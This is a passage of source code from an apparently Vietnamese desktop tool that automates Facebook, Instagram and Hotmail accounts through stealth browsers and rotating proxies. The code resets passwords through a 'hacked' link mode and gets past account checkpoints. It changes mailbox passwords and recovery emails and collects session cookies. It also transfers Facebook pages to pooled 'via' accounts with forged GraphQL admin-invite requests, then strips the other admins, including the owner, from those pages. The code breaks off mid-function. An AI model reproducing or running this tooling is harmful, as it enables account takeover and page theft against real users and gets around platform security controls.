const {app} = require('electron')
const path = require('path')
const fs = require('fs-extra')
const generator = require('generate-password')
const twofactor = require('node-2fa')
const puppeteer = require('puppeteer-extra')
const StealthPlugin = require('puppeteer-extra-plugin-stealth')
const fetch = require('node-fetch')
const {decode} = require('html-entities')

const {
    checkLinked, 
    getBackupLink, 
    getMailCode, 
    checkImap,
    useProxy,
    useTmProxy, 
    useShopLikeProxy, 
    useTinProxy, 
    useProxyFb, 
    randomUserAgent, 
    changeLanguage, 
    deleteInbox, 
    getTmMail, 
    getTmMailInbox, 
    randomNumberRange, 
    randomNumber, 
    loginWhatsApp,
    delayTimeout
} = require('./core.js')

const {loginFb, loginApi, loginFbCookie, loginCookieApi, checkPointDetector, getAccessToken, getAccessToken2, getAccessToken3} = require('./login.js')
const {Change, Account, Forgot} = require('./change.js')
const Tut = require('./tut.js')
const Page = require('./page.js')
const Xmdt = require('./xmdt.js')
const Hotmail = require('./hotmail.js')
const CC = require('currency-converter-lt')
const Db = require('./db.js')
const {zFetch} = require('./zquery.js')
const Insta = require('./instagram.js')
const {generateUsername} = require('unique-username-generator')
const moment = require('moment')
const promiseLimit = require('promise-limit')

const log = require('./log.js')
const { uuid } = require('systeminformation')
const { v4: uuidv4 } = require('uuid')

puppeteer.use(StealthPlugin())
const currencyConverter = new CC()

module.exports = (data, profilePath, send) => {

    return new Promise(async (resolve, reject) => {

        const setting = data.setting
        const tool = data.tool
        const item = data.item
        const mode = data.mode

        send('running', item.id)

        let browser

        if (mode !== 'viewChrome' && !setting.keepChrome.value) {

            const timeout = (setting.timeout.value * 100)

            let timer = setTimeout(async () => {

                try {

                    try { await browser.close() } catch {}

                    send('updateStatus', {id: item.id, status: 'Timeout'})

                    const time = moment().format('DD/MM/YYYY - H:m:s')

                    send('finish', {item, time})
                    
                    clearTimeout(timer)

                    return reject()

                } catch {}
                
            }, timeout)

        }

        

        try {

            let error = false

            // Check thông tin đầu vào 

            let ip = null
            let ipUser = null
            let ipPass = null

            let lastMsg = ''

            if (item.proxyKey && !error) {

                try {

                    if (setting.proxy.value === 'httpProxy' || setting.proxy.value === 'sProxy') {

                        const proxyParts = item.proxyKey.split(':')

                        ip = proxyParts[0]+':'+proxyParts[1]

                        if (proxyParts.length >= 4) {

                            ipUser = proxyParts[2]
                            ipPass = proxyParts[3]

                        }

                    }
                    
                    if (setting.proxy.value === 'tmProxy') {
                        ip = await useTmProxy(item.proxyKey, msg => {
                            send('message', {id: item.id, message: msg})
                        })
                    }

                    if (setting.proxy.value === 'shopLike') {
                        ip = await useShopLikeProxy(item.proxyKey, msg => {
                            send('message', {id: item.id, message: msg})
                        })
                    }

                    if (setting.proxy.value === 'tinSoft') {
                        ip = await useTinProxy(item.proxyKey, msg => {
                            send('message', {id: item.id, message: msg})
                        })
                    }

                    if (setting.proxy.value === 'proxyFb') {
                        ip = await useProxyFb(item.proxyKey, msg => {
                            send('message', {id: item.id, message: msg})
                        })
                    }

                } catch {
                    error = true
                }

            }

            if (ip && !error) {

                try {

                    let newIp = ''

                    if (ipUser && ipPass) {
                        newIp = ip+':'+ipUser+':'+ipPass
                    } else {
                        newIp = ip
                    }

                    const agent = useProxy(newIp)

                    let data = false 

                    try {
                        const res = await fetch('https://api.myip.com/', {agent})
                        data = await res.json()
                    } catch {
                        const res = await fetch('https://api.country.is', {agent})
                        data = await res.json()
                    }

                    if (data.ip) {

                        await send('message', {id: item.id, message: 'Sử dụng IP: '+data.ip})
                        await delayTimeout(1000)

                    } else {
                        error = true
                    }

                } catch (err) {

                    await send('message', {id: item.id, message: 'Lỗi proxy'})
                    error = true
                }

            }
            
            if (mode === 'checkLinked') {

                if (!error) {

                    let newIp = ''

                    if (ipUser && ipPass) {
                        newIp = ip+':'+ipUser+':'+ipPass
                    } else {
                        newIp = ip
                    }

                    const status = await checkLinked(item.email, msg => {
                        send('message', {id: item.id, message: msg})
                    }, newIp)
                
                    send('updateStatus', {id: item.id, status: status})

                }

            } else {

                // Khởi động trình duyệt

                let timer
                let checkBrowser

                if (!error) {

                    const flags = [
                        '--disable-web-security',
                        '--force-device-scale-factor=0.9',
                        '--disable-setuid-sandbox',
                        '--disable-dev-shm-usage',
                        '--disable-accelerated-2d-canvas',
                        '--no-first-run',
                        '--disable-gpu',
                        '--disable-notifications',
                    ]

                    try {

                        const ex = new Db('extensions')

                        const extData = (await ex.get()).map(item => item.path.replace('manifest.json', ''))

                        flags.push('--load-extension='+extData.join(','))

                    } catch {}

                    if (setting.devTools.value) {
                        flags.push('--auto-open-devtools-for-tabs')
                    }

                    if (ip && !error) {
                        send('message', {id: item.id, message: 'Sử dụng IP '+ip})
                        flags.push('--proxy-server='+ip)
                    }

                    const position = item.position.split('|')

                    flags.push(`--window-size=${setting.browserWidth.value+18},${setting.browserHeight.value+18}`)
                    flags.push(`--window-position=${position[0]},${position[1]}`)

                    if (setting.hideImage.value) {
                        flags.push('--blink-settings=imagesEnabled=false')
                    }

                    let headless = false

                    if (setting.hideChrome.value && mode !== 'viewChrome') {

                        headless = 'new'
                        flags.push(`--window-position=-999999,-999999`)
                    }
                    
                    browser = await puppeteer.launch({
                        headless,
                        args: flags,
                        defaultViewport: null,
                        executablePath: setting.chromePath.value,
                        ignoreHTTPSErrors: true,
                        userDataDir: profilePath
                    })

                    send('updatePid', {id: item.id, pid: browser.process().pid})

                    checkBrowser = setInterval(async () => {
                        try {

                            process.kill(browser.process().pid, 0)

                        } catch {

                            clearInterval(checkBrowser)
                            clearTimeout(timer)

                            const time = moment().format('DD/MM/YYYY - H:m:s')

                            send('finish', {item, time})
                            
                            return reject()
                            

                        }
                    }, 1000)
                    
                    const page = (await browser.pages())[0]
                    await page.setBypassCSP(true)

                    try {

                        const userAgent = await randomUserAgent(setting.userAgent.value)

                        await page.setUserAgent(userAgent)

                    } catch (err) {
                        log(err)
                    }

                    if (ipUser && ipPass) {
                        await page.authenticate({
                            username:ipUser, password:ipPass
                        })

                        ip = ip+':'+ipUser+':'+ipPass
                    }

                    if (item.type === 'instagram') {

                        const insta = new Insta(page, item, setting, browser.process().pid)

                        let error = false
                        let data = false

                        try {

                            send('message', {id: item.id, message: 'Đang đăng nhập Instagram'})

                            if (setting.useCookieInsta.value && item.cookies) {

                                const cookies = []

                                item.cookies.split(';').forEach(item => {
                                    
                                    const parts = item.split('=')
                                    
                                    if (parts[0].length > 0) {
                                        cookies.push({
                                            domain: ".instagram.com",
                                            name: parts[0].trim(),
                                            value: decode(parts[1])
                                        })
                                    }

                                })

                                await page.setCookie(...cookies)

                                await page.goto(`https://instagram.com`)

                            } else {

                                data = await insta.login(msg => {
                                    send('message', {id: item.id, message: msg})
                                })

                            }

                            send('message', {id: item.id, message: 'Đăng nhập Instagram thành công'})

                    
                        } catch (err) {

                            send('message', {id: item.id, message: 'Đăng nhập Instagram thất bại'})

                            if (err === '282') {

                                send('updateStatus', {id: item.id, status: 'Checkpoint 282'})
                                send('message', {id: item.id, message: 'Tài khoản bị Checkpoint'})

                                if (mode === 'moCheckPointInsta') {

                                    try {

                                        send('message', {id: item.id, message: 'Đang tiến hành kháng 282'})

                                        await insta.khang282(msg => {
                                            send('message', {id: item.id, message: msg})
                                        })

                                    } catch (err) {

                                        if (err) {
                                            send('message', {id: item.id, message: 'Kháng 282 thất bại: '+err})
                                        } else {
                                            send('message', {id: item.id, message: 'Kháng 282 thất bại'})
                                        }

                                        error = true
                                    }

                                } else {
                                    error = true
                                }

                            } else if (err === 'add_phone') {

                                send('updateStatus', {id: item.id, status: 'Checkpoint Add Phone'})
                                send('message', {id: item.id, message: 'Tài khoản bị Checkpoint'})

                            } else if (err == 'timeout') {

                                send('updateStatus', {id: item.id, status: 'Timeout'})

                                error = true

                            } else {

                                if (err) {
                                    send('message', {id: item.id, message: 'Đăng nhập Instagram thất bại: '+err})
                                }

                                error = true

                            }
                        }

                        if (!error) {

                            if (mode === 'getInfo' || setting.getInfoInsta.value) {

                                console.log('cccc')

                                send('message', {id: item.id, message: 'Đang lấy thông tin tài khoản'})

                                if (setting.infoCookieInsta.value) {

                                    send('message', {id: item.id, message: 'Đang lấy cookie'})

                                    let cookies = await page.cookies()

                                    cookies = cookies.map(item => {
                                        return item.name+'='+item.value
                                    }).join('; ')

                                    send('updateCookie', {
                                        id: item.id,
                                        type: 'instagram',
                                        cookies,
                                    })

                                }

                                send('message', {id: item.id, message: 'Lấy thông tin tài khoản thành công'})

                            }

                        }

                    } else {

                        if (mode === 'checkMail' || mode === 'unlockMail' || mode === 'batImap' || mode === 'changePassMail' || mode === 'addMail') {

                            let hotmail = new Hotmail(page, setting, item, ip)

                            let loginMailSuccess = false

                            let newEmail = false

                            try {

                                await hotmail.login(message => {
                                    send('message', {id: item.id, message: 'HOTMAIL: '+message})
                                })

                                await page.waitForTimeout(5000)

                                loginMailSuccess = true

                            } catch {

                                if (mode === 'changePassMail' || mode === 'addMail' || mode === 'batImap' || mode === 'checkMail') {

                                    if (setting.unlockAddMail.value || setting.unlockCodeMail.value || setting.unlockAddPhone.value) {

                                        try {

                                            newEmail = await hotmail.unlock((action, data) => {
                                                send(action, data)
                                            })

                                            if (newEmail) {

                                                item.recoverEmail = newEmail
                                                hotmail = new Hotmail(page, setting, item, ip)

                                            }
                                            
                                            loginMailSuccess = true

                                        } catch {}

                                    }

                                }

                            }
                            
                            if (loginMailSuccess) {

                                if (mode === 'batImap') {

                                    try {
                                        send('message', {id: item.id, message: 'HOTMAIL: Đang bật IMAP'})

                                        await hotmail.batImap()

                                        send('message', {id: item.id, message: 'HOTMAIL: Bật IMAP thành công'})

                                    } catch {

                                        send('message', {id: item.id, message: 'HOTMAIL: Bật IMAP thất bại'})

                                    }

                                }

                                if (mode === 'addMail') {

                                    try {

                                        await page.goto('https://account.live.com/password/Change?mkt=en-US&refd=account.microsoft.com&refp=profile')

                                        const email = await hotmail.addMail(message => {
                                            send('message', {id: item.id, message: 'HOTMAIL: '+message})
                                        }, newEmail)

                                        send('updateRecoveryEmail', {
                                            id: item.id,
                                            email,
                                        })

                                    } catch {}

                                }

                                if (mode === 'changePassMail') {

                                    try {
                                        send('message', {id: item.id, message: 'HOTMAIL: Đang đổi mật khẩu'})

                                        const password = await hotmail.changePassMail((action, data) => {
                                            send(action, data)
                                        })

                                        send('updateEmail', {
                                            id: item.id,
                                            newEmail: item.email,
                                            newEmailPassword: password
                                        })

                                        send('message', {id: item.id, message: 'HOTMAIL: Đổi mật khẩu thành công'})

                                    } catch (err) { log(err) }

                                }

                            } else {

                                if (mode === 'unlockMail') {

                                    await hotmail.unlock((action, data) => {
                                        send(action, data)
                                    })

                                }

                            }

                        } else {

                            const forgotPassword = setting.forgotPassword ? setting.forgotPassword.value : false

                            // Quên mật khẩu

                            let newPassword = ''
                            let forgotSuccess = false
                            let forgotHacked = false

                            if (mode !== 'viewChrome' && mode !== 'khang282' && mode !== 'getInfo' && mode !== 'adCheck') {

                                if (forgotPassword) {

                                    if (setting.forgotPasswordMode.value === 'hacked') {

                                        if (item.linkHacked) {

                                            try {

                                                send('message', {id: item.id, message: 'Đang reset mật khẩu chế độ hacked'})

                                                await page.goto(item.linkHacked)

                                                await page.waitForSelector('button[value="1"]')

                                                await page.click('button[value="1"]')

                                                await page.waitForSelector('[name="approvals_code"]')

                                                forgotHacked = true

                                            } catch {

                                                send('message', {id: item.id, message: 'Reset mật khẩu chế độ hacked thất bại'})
                                            
                                            }


                                        } else {
                                            error = true 
                                            send('message', {id: item.id, message: 'Không tìm thấy link hacked'})

                                        }

                                        if (!forgotHacked) {
                                            let cookies = await page.cookies()

                                            cookies = cookies.map(item => {
                                                return item.name+'='+item.value
                                            }).join('; ')

                                            send('updateCookie', {
                                                id: item.id,
                                                cookies,
                                            })
                                        }

                                    } else {

                                        try {

                                            if (ipUser && ipPass) {
                                                ip = ip+':'+ipUser+':'+ipPass
                                            }

                                            const linkStatus = await checkLinked(item.email, msg => {
                                                send('message', {id: item.id, message: msg})
                                            }, ip)
                                        
                                            if (linkStatus === 'Còn liên kết') {

                                                let page2 = false

                                                if (setting.readEmailMode.value === 'browser') {

                                                    page2 = await browser.newPage()

                                                    const hotmail = new Hotmail(page2, setting, item, ip)

                                                    try {

                                                        await hotmail.login(message => {
                                                            send('message', {id: item.id, message: 'HOTMAIL: '+message})
                                                        })

                                                        await page.bringToFront()

                                                    } catch {
                                                        error = true
                                                    }

                                                } else {
                                                    
                                                    try {

                                                        const result = await checkImap(item.email, item.passMail)
        
                                                        if (!result) {
                                                            error = true
                                                            send('message', {id: item.id, message: 'Reset mật khẩu thất bại: Email khóa'})
                                                        }
        
                                                    } catch {
                                                        error = true
                                                        send('message', {id: item.id, message: 'Reset mật khẩu thất bại: Không thể check email'})
                                                    }
                                                }

                                                if (!error) {

                                                    const forgot = new Forgot(page, page2, setting, item.email, item.passMail)

                                                    send('message', {id: item.id, message: 'Đang tiến hành reset mật khẩu'})

                                                    if (setting.forgotPasswordMode.value === 'api') {

                                                        newPassword = await forgot.forgotPasswordApi(false, (message) => {
                                                            send('message', {id: item.id, message})
                                                        })

                                                    }

                                                    if (setting.forgotPasswordMode.value === 'mbasic') {

                                                        newPassword = await forgot.forgotPasswordMbasic(false, (message) => {
                                                            send('message', {id: item.id, message})
                                                        })

                                                    }

                                                    if (newPassword) {

                                                        if (newPassword) {}
                                                        send('updatePassword', {
                                                            id: item.id,
                                                            new: newPassword
                                                        })

                                                        item.password = newPassword

                                                    } 

                                                    send('message', {id: item.id, message: 'Reset mật khẩu thành công'})

                                                    forgotSuccess = true

                                                }

                                            } else {

                                                error = true
                                                send('message', {id: item.id, message: 'Reset mật khẩu thất bại: Mất liên kết'})

                                            }

                                        } catch (err) {
                                            error = true
                                            send('message', {id: item.id, message: 'Reset mật khẩu thất bại'})
                                        }

                                    }

                                    await page.waitForTimeout(5000)

                                }

                            }

                            let data = false
                            let newEmail = false
                            let skip2Fa = false

                            // Bắt đầu đăng nhập

                            if (!error) {

                                send('message', {id: item.id, message: 'Đăng nhập bằng '+setting.subDomain.value+'.facebook.com'})

                                if (mode === 'normal' && tool ==='change' && setting.changeCookie.value) {
                                    setting.useCookie.value = true
                                }

                                if (setting.useCookie.value && item.cookies) {

                                    try {

                                        data = await loginFbCookie(page, item.cookies, setting, mode, (status) => {
                                            send('updateStatus', {id: item.id, status})
                                        })

                                        send('message', {id: item.id, message: 'Đăng nhập thành công!'})

                                    } catch (err) {

                                        error = true

                                        if (err) {
                                            send('message', {id: item.id, message: err})
                                        } else {
                                            send('message', {id: item.id, message: 'Đăng nhập thất bại'})
                                        }
                                    }

                                } else {

                                    try {

                                        data = await loginFb(page, item.uid, item.password, item.twofa, setting, mode, forgotSuccess, forgotHacked, browser.process().pid, (msg) => {
                                            send('message', {id: item.id, message: msg})
                                        }, (newPassword) => {

                                            send('updatePassword', {
                                                id: item.id,
                                                new: newPassword
                                            })

                                            item.password = newPassword

                                        }, (status) => {
                                            send('updateStatus', {id: item.id, status})
                                        })

                                        send('message', {id: item.id, message: 'Đăng nhập thành công!'})

                                    } catch (err) {

                                        error = true

                                        if (err) {
                                            send('message', {id: item.id, message: err})
                                        } else {
                                            send('message', {id: item.id, message: 'Đăng nhập thất bại'})
                                        }

                                    }

                                }

                                if (!error) {

                                    // Đổi Tiếng Việt 

                                    try {
                                        await page.waitForTimeout(5000)
                                        await changeLanguage(page, 'vi_VN')
                                    } catch (err) {
                                        log(err)
                                    }

                                }
                    
                            }

                            if (forgotHacked && !error) {

                                const xmdt = new Xmdt(page, item, setting, ip)

                                const url = await page.url()

                                if (url.includes('828281030927956')) {

                                    try {

                                        let result = true
                                        let page2 = false

                                        if (setting.readEmailMode.value === 'browser') {

                                            page2 = await browser.newPage()

                                            const hotmail = new Hotmail(page2, setting, item, ip)

                                            try {

                                                await hotmail.login(message => {
                                                    send('message', {id: item.id, message: 'HOTMAIL: '+message})
                                                }, true)

                                                await page.bringToFront()

                                            } catch {
                                                error = true
                                            }

                                        } else {

                                            const emailData = item.oldEmail.split('|')

                                            result = await checkImap(emailData[0], emailData[1])
                                        }

                                        if (result) {

                                            if (!error) {

                                                send('message', {id: item.id, message: 'Đang tiến hành mở khóa 956'})

                                                await xmdt.khang956(message => {
                                                    send('message', {id: item.id, message})
                                                }, page2, true)

                                                send('message', {id: item.id, message: 'Mở khóa 956 thành công'})

                                            }

                                        } else {
                                            send('message', {id: item.id, message: 'Mở khóa 956 thất bại: Mail die'})
                                        }

                                    } catch (err) {

                                        let cookies = await page.cookies()

                                        cookies = cookies.map(item => {
                                            return item.name+'='+item.value
                                        }).join('; ')

                                        send('updateCookie', {
                                            id: item.id,
                                            cookies,
                                        })

                                        error = true
                                    }

                                } else {

                                }

                            }


                            if (mode === 'normal' && tool === 'page' && !error) {

                                const fbPage = new Page(page, item, data.fb_dtsg, data.accessToken, data.lsd)

                                if (setting.createPage.value) {
                                    
                                    const pageNumber = setting.pageNumber.value 
                                    let createPageSuccess = 0

                                    for (let index = 1; index <= pageNumber; index++) {
                                        
                                        try {

                                            send('message', {id: item.id, message: 'Đang tạo Page '+index+'/'+pageNumber})

                                            await fbPage.createPage(setting.pageName.value)

                                            createPageSuccess++


                                        } catch {}

                                        await page.waitForTimeout(3000)
                                        
                                    }

                                    send('message', {id: item.id, message: 'Tạo thành công '+createPageSuccess+'/'+pageNumber+' page'})

                                    lastMsg = 'Tạo thành công '+createPageSuccess+'/'+pageNumber+' page'

                                }

                                if (setting.renamePage.value) {

                                    let accPage = await fbPage.getPage()

                                    if (setting.renameMode.value === 'id') {

                                        let pageIds = setting.listId.value.split(/\r?\n|\r|\n/g).filter(item => item)

                                        if (pageIds) {

                                            accPage = accPage.filter(item => pageIds.includes(item.additional_profile_id))

                                        }

                                    }

                                    let renameSuccess = []
                                    let renameFailed = []

                                    for (let index = 0; index < accPage.length; index++) {

                                        try { process.kill(browser.process().pid, 0)} catch { break }

                                        const pageId = accPage[index].additional_profile_id

                                        let switchPageSuccess = false

                                        try {

                                            send('message', {id: item.id, message: 'Đang chuyển tài khoản sang page '+pageId})

                                            await fbPage.switchPage(pageId)

                                            switchPageSuccess = true 

                                            send('message', {id: item.id, message: 'Chuyển tài khoản sang page '+pageId+' thành công'})

                                        } catch {
                                            send('message', {id: item.id, message: 'Chuyển tài khoản sang page '+pageId+' thất bại'})
                                        }

                                        if (switchPageSuccess) {

                                            try {

                                                send('message', {id: item.id, message: 'Đang đổi tên page '+pageId})

                                                await fbPage.renamePage(pageId, setting.newPageName.value)

                                                send('message', {id: item.id, message: 'Đổi tên page '+pageId +' thành công'})

                                                renameSuccess.push(pageId)

                                            } catch {

                                                renameFailed.push(pageId)

                                                send('message', {id: item.id, message: 'Đổi tên page '+pageId +' thất bại'})
                                            }

                                            let switchToMainSuccess = false

                                            for (let index = 0; index < 5; index++) {

                                                try { process.kill(browser.process().pid, 0)} catch { break }
                                                
                                                try {
                                                    await fbPage.switchToMain()
                                                    switchToMainSuccess = true
                                                    break
                                                } catch {}

                                                await page.waitForTimeout(1000)

                                            }

                                            if (!switchToMainSuccess) {

                                                send('message', {id: item.id, message: 'Không thể chuyển về profile chính'})

                                                break

                                            }

                                            await page.waitForTimeout(3000)

                                        } else {
                                            renameFailed.push(pageId)
                                        }
                                        
                                    }

                                    send('message', {id: item.id, message: 'Đổi tên thành công '+renameSuccess.length+'/'+accPage.length+' page'})

                                    lastMsg = 'Đổi tên thành công '+renameSuccess.length+'/'+accPage.length+' page'

                                    send('renamePageResult', {success: renameSuccess, error: renameFailed})

                                }

                                if (setting.addPage.value) {

                                    let accPage = await fbPage.getPage()

                                    if (setting.addPageMode.value === 'id') {

                                        let pageIds = setting.addPageId.value.split(/\r?\n|\r|\n/g).filter(item => item)

                                        if (pageIds) {

                                            accPage = accPage.filter(item => pageIds.includes(item.additional_profile_id))

                                        }

                                    }

                                    let bmExsist = false 

                                    try {
                                        await fbPage.checkBm(setting.addPageBmId.value)
                                        bmExsist = true 
                                    } catch {}

                                    if (bmExsist) {

                                        try {

                                            const accessToken = await getAccessToken3(page, item.uid, data.fb_dtsg, item.twofa)

                                            let addPageSuccess = 0

                                            for (let index = 0; index < accPage.length; index++) {

                                                try { process.kill(browser.process().pid, 0)} catch { break }

                                                const pageId = accPage[index].id

                                                try {

                                                    send('message', {id: item.id, message: 'Đang thêm page '+pageId+' vào BM '+setting.addPageBmId.value})

                                                    await fbPage.addPage(setting.addPageBmId.value, pageId, accessToken)

                                                    addPageSuccess++

                                                } catch (err) {
                                                    console.log(err)
                                                }

                                                await page.waitForTimeout(3000)

                                            }

                                            send('message', {id: item.id, message: 'Thêm thành công '+addPageSuccess+'/'+accPage.length+' page vào BM '+setting.addPageBmId.value})

                                            lastMsg = 'Thêm thành công '+addPageSuccess+'/'+accPage.length+' page vào BM '+setting.addPageBmId.value

                                        } catch {
                                            send('message', {id: item.id, message: 'Không thể lấy Access Token'})
                                        }

                                    } else {
                                        send('message', {id: item.id, message: 'Không tìm thấy BM'})
                                    }

                                }

                                if (setting.sharePage.value) {

                                    try {

                                        const pageVia = new Db('pageVia')

                                        let accPage = await fbPage.getPage()

                                        if (setting.sharePageMode.value === 'id') {

                                            let pageIds = []

                                            if (setting.sharePageId.value.includes(',')) {
                                                pageIds = setting.sharePageId.value.split(',').map(item => item.trim()).filter(item => item)
                                            } else {
                                                pageIds = setting.sharePageId.value.split(/\r?\n|\r|\n/g).map(item => item.trim()).filter(item => item)
                                            }

                                            if (pageIds) {

                                                accPage = accPage.filter(item => pageIds.includes(item.id))

                                            }

                                        }

                                        const z = new zFetch(page)

                                        let shareSuccessCount = 0

                                        await page.goto('https://mbasic.facebook.com')

                                        for (let index = 0; index < accPage.length; index++) {

                                            try { process.kill(browser.process().pid, 0)} catch { break }

                                            const pageId = accPage[index].additional_profile_id
                                            const pageId2 = accPage[index].id

                                            let via = false 

                                            for (let index = 0; index < 99; index++) {

                                                try { process.kill(browser.process().pid, 0)} catch { break }

                                                try {
                                                    via = await pageVia.findRandom(item => item.process === 'UID Live' && item.count < setting.maxPage.value && !item.running)
                                                    break
                                                } catch {}

                                                await page.waitForTimeout(1000)

                                            }

                                            if (via) {

                                                try {

                                                    await pageVia.update(via.id, {running: true})

                                                    const res = await (await fetch('https://graph2.facebook.com/v3.3/'+via.uid+'/picture?redirect=0')).json()
                                
                                                    if (res.data.width && res.data.height) {
                
                                                        send('message', {id: via.id, message: 'UID Live'})
                
                                                        await pageVia.update(via.id, {process: 'UID Live'})
                
                                                        try {
                
                                                            send('message', {id: item.id, message: 'Đang đăng nhập: '+via.uid})
                
                                                            via.dtsg = await loginCookieApi(via.cookies)
                
                                                            send('message', {id: item.id, message: 'Đăng nhập thành công: '+via.uid})
                
                                                        } catch {
                
                                                            send('message', {id: item.id, message: 'Đăng nhập thất bại: '+via.uid})
                
                                                            send('message', {id: via.id, message: 'UID Die'})
                
                                                            await pageVia.update(via.id, {process: 'UID Die'})
                                                            
                                                        }
                                                                                                                                                        
                                                    } else {
                                                        send('message', {id: item.id, message: 'Tài khoản die: '+via.uid})
                                                        send('message', {id: via.id, message: 'UID Die'})
                                                        await pageVia.update(via.id, {process: 'UID Die'})
                                                    }

                                                    if (via.dtsg) {

                                                        let switchPageSuccess = false

                                                        try {

                                                            send('message', {id: item.id, message: 'Đang chuyển tài khoản sang page '+pageId})

                                                            await fbPage.switchPage(pageId)

                                                            switchPageSuccess = true 

                                                            send('message', {id: item.id, message: 'Chuyển tài khoản sang page '+pageId+' thành công'})

                                                        } catch (err) {
                                                            if (err) {
                                                                send('message', {id: item.id, message: 'Chuyển tài khoản sang page '+pageId+' thất bại: '+err})
                                                            } else {
                                                                send('message', {id: item.id, message: 'Chuyển tài khoản sang page '+pageId+' thất bại'})
                                                            }
                                                        }

                                                        if (switchPageSuccess) {

                                                            try {

                                                                const pageData = await fbPage.getPageData(pageId2)

                                                                if (pageData.token && pageData.dtsg) {

                                                                    send('message', {id: item.id, message: 'Đang share page '+pageId})

                                                                    const inviteId = await fbPage.sharePage(pageId, via.uid, pageData)

                                                                    send('message', {id: item.id, message: 'Đang chấp nhận lời mời'})

                                                                    const res = await fetch("https://www.facebook.com/api/graphql/", {
                                                                        "headers": {
                                                                            "accept": "*/*",
                                                                            "accept-language": "en-US,en;q=0.9",
                                                                            "content-type": "application/x-www-form-urlencoded",
                                                                            "dpr": "0.9",
                                                                            "sec-ch-prefers-color-scheme": "light",
                                                                            "sec-fetch-dest": "empty",
                                                                            "sec-fetch-mode": "cors",
                                                                            "sec-fetch-site": "same-origin",
                                                                            "viewport-width": "1046",
                                                                            "x-asbd-id": "129477",
                                                                            "x-fb-friendly-name": "ProfilePlusCometAcceptOrDeclineAdminInviteMutation",
                                                                            "x-fb-lsd": "pjikTDokwYgp0FR-8rF3y6",
                                                                            "cookie": via.cookies,
                                                                            "Referer": "https://www.facebook.com/profile.php?id="+pageId,
                                                                            "Referrer-Policy": "strict-origin-when-cross-origin"
                                                                        },
                                                                        "body": 'av='+via.uid+'&__user='+via.uid+'&__a=1&__req=l&__hs=19697.HYP:comet_pkg.2.1..2.1&dpr=1&__ccg=UNKNOWN&__rev=1010231448&__s=t0vk25:fty6ix:8kysjv&__hsi=7309326793564706859&__dyn=7AzHK4HzE4e5Q1ryaxG4Vp62-m1xDwAxu13wFwnUW3q5UObwNwnof8boG0x8bo6u3y4o2Gwfi0LVEtwMw65xO2OU7m221FwgolzUO0-E7m4oaEnxO0Bo7O2l2Utwwwi831wiE567Udo5qfK0zEkxe2GewyDwkUtxGm2SUbElxm3y11xfxmu3W3y261eBx_y88E3qxWm2CVEbUGdG1Fwh888cA0z8c84q58jwTwNxe6Uak1xwJwxyo566k1FwgU4q3G1eKufw&__csr=gnMgshffmNa9OSItW2kn8IRnFiIn5lp2h6zlmgQjRRYG4RQCRrmiO26ZRV9QF6QFbmGgy4oGAunzGGhauU-EF3BUO-9yFoiS8gTDAKiuGyUhh8igCm-6U-8yEhhpoqypE-qVKcwAjyA7rxibAyE4eqaVk2ym6E-jy-uicjwKU76F8iwVyrCxy1ezES2K7bwAxN1W2y2i78euqii1wCwgo6GfwNzo8oiw9m2a2G0K80Nq09gwv409qw28E0iLweK5C00keG5xg0Ga0LoG0huFU-05iU1C8bbg0KGgDwnU0Na06bU0Cx0fK07dE7u5U0hJw19Xw1a203Ry1tw1Ym06dm&__comet_req=15&fb_dtsg='+via.dtsg+'&jazoest=25337&lsd=pjikTDokwYgp0FR-8rF3y6&__aaid=0&__spin_r=1010231448&__spin_b=trunk&__spin_t=1701835262&qpl_active_flow_ids=1056839232&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=ProfilePlusCometAcceptOrDeclineAdminInviteMutation&variables={"input":{"client_mutation_id":"1","actor_id":"'+via.uid+'","is_accept":true,"profile_admin_invite_id":"'+inviteId+'","user_id":"'+pageId+'"},"scale":1}&server_timestamps=true&doc_id=6865760120184155&fb_api_analytics_tags=["qpl_active_flow_ids=1056839232"]',
                                                                        "method": "POST"
                                                                    })

                                                                    const html = await res.text()

                                                                    if (html.includes(pageId)) {

                                                                        send('message', {id: item.id, message: 'Share page '+pageId+' thành công'})

                                                                        const count = (await pageVia.findById(via.id)).count

                                                                        await pageVia.update(via.id, {count: count + 1})

                                                                        if (setting.removeAdmin.value) {

                                                                            try {

                                                                                const admins = await fbPage.getPageAdmin(pageId2, pageData)

                                                                                const other = admins.filter(user => user.id != item.uid && user.id != via.uid)

                                                                                for (let index = 0; index < other.length; index++) {

                                                                                    try { process.kill(browser.process().pid, 0)} catch { break }
                                                                                    
                                                                                    send('message', {id: item.id, message: 'Đang xóa user '+other[index].id})

                                                                                    try {

                                                                                        await fbPage.removeAdmin(pageId, other[index].id, pageData)

                                                                                        send('message', {id: item.id, message: 'Xóa user '+other[index].id+' thành công'})

                                                                                    } catch {
                                                                                        if (err) {
                                                                                            send('message', {id: item.id, message: 'Xóa user '+other[index].id+' thất bại: '+err})
                                                                                        } else {
                                                                                            send('message', {id: item.id, message: 'Xóa user '+other[index].id+' thất bại'})
                                                                                        }
                                                                                    }

                                                                                    await page.waitForTimeout(2000)

                                                                                }

                                                                                try {

                                                                                    send('message', {id: item.id, message: 'Đang xóa user '+item.uid})

                                                                                    send('message', {id: item.id, message: 'Xóa user '+item.uid+' thành công'})

                                                                                    await fbPage.removeAdmin(pageId, item.uid, pageData)

                                                                                } catch (err) {
                                                                                    if (err) {
                                                                                        send('message', {id: item.id, message: 'Xóa user '+item.uid+' thất bại: '+err})
                                                                                    } else {
                                                                                        send('message', {id: item.id, message: 'Xóa user '+item.uid+' thất bại'})
                                                                                    }
                                                                                }

                                                                            } catch {}

                                                                        }

                                                                        shareSuccessCount++

                                                                    } else {
                                                                        send('message', {id: item.id, message: 'Share page '+pageId+' thất bại'})
                                                                    }

                                                                } else {
                                                                    send('message', {id: item.id, message: 'Không thể lấy thông tin page '+pageId })
                                                                }

                                                            } catch (err) {
                                                                if (err) {
                                                                    send('message', {id: item.id, message: 'Share page '+pageId+' thất bại: '+err})
                                                                } else {
                                                                    send('message', {id: item.id, message: 'Share page '+pageId+' thất bại'})
                                                                }
                                                            }

                                                            let switchToMainSuccess = false

                                                            for (let index = 0; index < 5; index++) {

                                                                try { process.kill(browser.process().pid, 0)} catch { break }
                                                                
                                                                try {
                                                                    await fbPage.switchToMain()
                                                                    switchToMainSuccess = true
                                                                    break
                                                                } catch {}

                                                                await page.waitForTimeout(1000)

                                                            }

                                                            if (!switchToMainSuccess) {

                                                                send('message', {id: item.id, message: 'Không thể chuyển về profile chính'})

                                                                break

                                                            }

                                                        }
                                                    
                                                    }
                
                
                                                } catch (err) {
                                                    console.log(err)
                                                }

                                                await pageVia.update(via.id, {running: false})

                                            } else {

